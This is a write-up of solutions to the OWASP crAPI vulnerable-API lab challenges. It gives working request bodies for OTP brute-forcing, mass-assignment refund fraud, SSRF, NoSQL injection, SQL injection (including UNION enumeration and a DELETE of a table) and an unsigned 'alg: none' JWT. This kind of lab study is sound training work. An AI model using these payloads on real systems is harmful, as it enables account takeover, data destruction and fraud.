> Based on crAPI's challenges
# BOLA
---
### Challenge 1: Access details of another user’s vehicle
- Visiting the community forum will make you fetch a request: `/community/api/v2/community/posts/recent?limit=30&offset=0` that later leaks sensitive information in the response including the vehicle id.
- In the dashboard page, when using the `Refresh Location` feature will fetch a request to `/identity/api/v2/vehicle/4e99ffd9-79d7-4d19-8e0c-5560b00ee53b/location` to get the location and other informations using the vehicle id.
### Challenge 2: Access mechanic reports of other users
Exploit chain:
- Submit a service request via `/workshop/api/merchant/contact_mechanic`
- View service history, and choose a specific report -> leak `/workshop/api/mechanic/mechanic_report?report_id=` endpoint that returns the service report via `report_id`
# Broken User Authentication
---
### Reset the password of a different user
- Valid user's email address can be exposed from multiple source, one of them is via the community forum at `/community/api/v2/community/posts/recent?limit=30&offset=0`.
- Send the email address to `/identity/api/auth/forget-password` to receive a 4-digit OTP.
- Send OTP, email and new password to `/identity/api/auth/v3/check-otp` to request a password reset.
- Since the OTP is only 4-digit long, it is feasible to brute force to guess the OTP. But after 10 attempts, you'll receive the error "You've exceeded the number of attempts." which means the protection mechanism stepped in. However, observing the `v3` in the endpoint, comparing with other API endpoint that has `v2`, we can suspect a `v2` of this OTP verify that may still be vulnerable to this brute forcing attack.
- Try requesting OTP again, but this time brute force against `/identity/api/auth/v2/check-otp`. 
> Also vulnerable to: Improper Inventory Management
# Excessive Data Exposure
---
### Challenge 4 - Find an API endpoint that leaks sensitive information of other users
- `/community/api/v2/community/posts/recent?limit=30&offset=0`
### Challenge 5 - Find an API endpoint that leaks an internal property of a video
- When checking your own profile, you will fetch a request to `/identity/api/v2/user/videos/<video-id>` that leaks internal property of your own video
# Rate limiting
---
### Challenge 6 - Perform a layer 7 DoS using ‘contact mechanic’ feature
When finish the contact mechanic form, you will send data to `/workshop/api/merchant/contact_mechanic` containing:
```json
{
	"mechanic_code":"TRAC_JHN",
	"problem_details":"gfsdgsdfgsdf",
	"vin":"8RS5MYAH7588LC694",
	"mechanic_api":"https://localhost:8443/workshop/api/mechanic/receive_report",
	"repeat_request_if_failed":false,
	"number_of_repeats":1
}
```
This can be captured and modified to change the `repeat_request_if_failed` to true and `number_of_repeats` to a big number, which then cause the server to return `503 Sevice Unavailable` code with:
```json
{
	"message":"Service unavailable. Seems like you caused layer 7 DoS :)"
}
```
that confirmed the DOS vulnerability.
# BFLA
---
### Challenge 7 - Delete a video of another user
- When visiting user profile, notice there is a request to fetch user's video (if any) at `/identity/api/v2/user/videos/<video-id>`. If you try changing the method from GET TO DELETE, you will receive following message:
```json
{
	"message":"This is an admin function. Try to access the admin API",
	"status":403
}
```
However, when replacing `user` with `admin`, and send DELETE request again to the new endpoint `/identity/api/v2/admin/videos/53`:
```json
{
	"message":"User video deleted successfully.",
	"status":200
}
```
# Mass Assignment
---
### Challenge 8 - Get an item for free
When requesting for a specific order via `/workshop/api/shop/orders/<order-id>`, you will receive details about the order, which include the `status` field that has value `delivered`, when first bought the order, then `return pending` when user requested a return.
When trying to change the request to PUT to the same endpoint, having the body:
```json
{
	"status": "return success"
}
```
You will receive a response containing a message:
```json
{
	"message":"The value of 'status' has to be 'delivered','return pending' or 'returned'"
}
```
That leaks the state of the returned item to be `"status": "returned"`. By editing the PUT request, user then receive a 200 code with the money returned.
### Challenge 9 - Increase your balance by $1,000 or more
Same steps as Challenge 8, but before changing the status to `returned`, modify the body to:
```json
{
	"quantity": 10000
}
```
This will make the order's quantity to be 10000, after that when changing the status to `returned`, you will be refunded with more than $10000
### Challenge 10 - Update internal video properties
In the profile page, when using the `Change video name` feature we are doing a PUT request against `/identity/api/v2/user/videos/<video-id>` endpoint, and the body is the desired name, now we can change the body to:
```json
{
	"conversion_params":"<desired-conversion-params>"
}
```
to change the internal property of the video.
One special thing is there might be no restrictions of what the value can be.
# SSRF
---
### Challenge 11 - Make crAPI send an HTTP call to "[www.google.com](https://github.com/OWASP/crAPI/blob/develop/docs/www.google.com)" and return the HTTP response.
After filling the contact mechanic form, you will POST the form data to `/workshop/api/merchant/contact_mechanic` endpoint containing:
```json
{
	"mechanic_code":"TRAC_JHN",
	"problem_details":"gfsdgsdfgsdf",
	"vin":"8RS5MYAH7588LC694",
	"mechanic_api":"https://localhost:8443/workshop/api/mechanic/receive_report",
	"repeat_request_if_failed":false,
	"number_of_repeats":1
}
```
Notice the field `mechanic_api`, and the response:
```json
{
	"response_from_mechanic_api":{
		"id":10,
		"sent":true,
		"report_link":"https://localhost:8443/workshop/api/mechanic/mechanic_report?report_id=10"
	},
	"status":200
}
```
This indicates that the server is requesting the endpoint provided in the `mechanic_api` field. Modify the field to `https://www.google.com` and send again, the response is now including the response when requesting to www.google.com.
# NoSQL injection
---
### Challenge 12 - Find a way to get free coupons without knowing the coupon code.
The `Add Coupon` Feature in the Shop page will validate a coupon by sending a POST request to `/community/api/v2/coupon/validate-coupon` endpoint, with a json body containing the coupon code. Normally, if you enter an invalid code, the server will response with 500 status code `Internal Server Error`. By modifying the payload to:
```json
{"coupon_code":
	{
		"$ne":null
	}
}
```
The server will response with a 200 code containing informations of valid coupons:
```json
{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2026-10-02T12:52:58.512Z"}
```
# SQL Injection
---
### Challenge 13 - Find a way to redeem a coupon that you have already claimed by modifying the database
Notice when applying a valid coupon, after successfully validating against the backend, it performs the coupon application by requesting to `/workshop/api/shop/apply_coupon` with the body containing the code:
```json
{"coupon_code":"TRAC075","amount":75}
```
Later if you want to re-apply the coupon, the server response with
```json
{"message":"TRAC075 Coupon code is already claimed by you!! Please try with another coupon code"}
```
By injecting a single quote character `'` into the `coupon_code` field, notice that the server return with 500 code instead. To further confirming the SQL injection vulnerability of this parameter, generating two different payloads:
```json
{"coupon_code":"TRAC075' and 1=1-- -","amount":75}

{"coupon_code":"TRAC075' and 1=2-- -","amount":75}
```
Notice that on the second payload, the server return 
```json
{"message":"Coupon not found"}
```
Instead of the `coupon already claimed` message, indicating the possibility of BOOLEAN based sql injection. The message `Coupon not found` reveals that the `coupon_code` field maybe passed into a SELECT statement.
Further detection:
```json
{"coupon_code":"TRAC075'; select pg_sleep(10);","amount":75}
```
Notice the delay in the response comparing to other payloads, this indicates that the `pg_sleep` function does work, which means the backend database is PosgreSQL.
Getting database tables:
```json
{"coupon_code":"-3578' UNION ALL select string_agg(table_name, '; ') from information_schema.tables-- -","amount":75}
```
Getting columns:
```json
{"coupon_code":"-3578' UNION ALL select string_agg(column_name, '; ') from information_schema.columns-- -","amount":75}
```
Specific tables to notice in this challenge including `applied_coupon` that tracks the coupons that are used by users by their `id`. To re-apply used coupons just delete the record from this table:
```json
{"coupon_code":"-3578'; delete from applied_coupon-- -","amount":75}
```
This will returns 5000 status code. But we can confirm the deletion by re-applying the coupon code.
# Unauthorized Access
---
### Challenge 14 - Find an endpoint that does not perform authentication checks for a user.
The `/workshop/api/shop/orders/<order-id>` still returning order informations without `Authorization` header.
# JWT Vulnerabilities
---
### Challenge 15 - Find a way to forge valid JWT Tokens
Notice your Authorization jwt is being verified agains `/identity/api/auth/verify` endpoint.
Inspecting one of the jwt generated by the application:
Header:
```json
{
  "alg": "RS256"
}
```
Payload:
```json
{
  "sub": "pwn@gmail.com",
  "iat": 1791518537,
  "exp": 1792123337,
  "role": "user"
}
```
So the jwt is signed using RS256 algorithm. Try if this endpoint accept a jwt with `alg: none`:
```json
{"token":"eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiJwd25AZ21haWwuY29tIiwiaWF0IjoxNzkxNTE4NTM3LCJleHAiOjE3OTIxMjMzMzcsInJvbGUiOiJhZG1pbiJ9."}
```
Same payload, but the header has been modified to `{"alg": "none"}`, the server response with:
```json
{"message":"The token is a valid JWT token","status":200}
```
Which means it still accepts jwt tokens without signing algorithms.